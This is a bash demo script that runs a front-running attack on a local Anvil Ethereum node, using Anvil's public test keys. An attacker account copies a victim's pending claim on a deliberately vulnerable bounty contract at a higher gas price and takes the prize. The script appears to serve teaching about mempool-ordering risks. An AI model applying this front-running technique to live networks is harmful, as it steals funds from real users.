#!/usr/bin/env bash
# LIVE front-running demo on a LOCAL Anvil node (throw-away keys only).
# Shows that the transaction with the HIGHER gas price is mined FIRST, so a bot that copies a victim's
# pending claim("ethereum") steals the bounty.
set -euo pipefail
export PATH="$HOME/.foundry/bin:$PATH"
RPC=http://127.0.0.1:8545

# Anvil's well-known public test accounts
DEPLOYER_PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
VICTIM_PK=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a      # account #2
VICTIM=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
ATTACKER_PK=0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6     # account #3
ATTACKER=0x90F79bf6EB2c4f870365E785982E1f101E93b906

echo "### 1. start a local node"
anvil --silent --port 8545 &
ANVIL_PID=$!
trap 'kill $ANVIL_PID 2>/dev/null' EXIT
sleep 2

echo "### 2. deploy VulnerableBounty with 5 ETH prize (answer hash of 'ethereum')"
HASH=$(cast keccak "ethereum")
BOUNTY=$(forge create src/vulnerable/VulnerableBounty.sol:VulnerableBounty --rpc-url $RPC --private-key $DEPLOYER_PK \
        --broadcast --value 5ether --constructor-args "$HASH" | awk '/Deployed to:/ {print $3}')
echo "bounty at $BOUNTY, balance: $(cast balance $BOUNTY --ether) ETH"

echo "### 3. stop automining: transactions now WAIT in the mempool until we mine a block"
cast rpc --rpc-url $RPC evm_setAutomine false >/dev/null

echo "### 4. victim sends claim('ethereum') with a LOW gas price (2 gwei)"
VICTIM_TX=$(cast send $BOUNTY "claim(string)" "ethereum" --rpc-url $RPC --private-key $VICTIM_PK --gas-price 2gwei --gas-limit 150000 --async)
echo "victim tx   : $VICTIM_TX (pending)"

echo "### 5. attacker sees it in the mempool and copies the calldata with a HIGH gas price (50 gwei)"
# (explicit --gas-limit: a bot skips estimateGas, which would run on the pending state and already see the victim tx)
cast rpc --rpc-url $RPC eth_getTransactionByHash "$VICTIM_TX" | python3 -c 'import sys,json;print("   copied calldata:", json.load(sys.stdin)["input"][:74]+"...")'
ATTACKER_TX=$(cast send $BOUNTY "claim(string)" "ethereum" --rpc-url $RPC --private-key $ATTACKER_PK --gas-price 50gwei --gas-limit 150000 --async)
echo "attacker tx : $ATTACKER_TX (pending)"

echo "### 6. mine ONE block: the miner orders transactions by fee"
cast rpc --rpc-url $RPC evm_mine >/dev/null

echo "### 7. result"
for t in "victim:$VICTIM_TX" "attacker:$ATTACKER_TX"; do
  name=${t%%:*}; hash=${t#*:}
  idx=$(cast receipt $hash --rpc-url $RPC --json | python3 -c 'import sys,json;r=json.load(sys.stdin);print("position in block =",int(r["transactionIndex"],16),"| status =", "SUCCESS" if r["status"] in ("0x1","1") else "REVERTED")')
  echo "$name -> $idx"
done
echo "bounty claimed by: $(cast call $BOUNTY 'claimed()(bool)' --rpc-url $RPC)"
echo "attacker balance : $(cast balance $ATTACKER --ether) ETH   (started with 10000)"
echo "victim balance   : $(cast balance $VICTIM --ether) ETH   (lost gas, got nothing)"
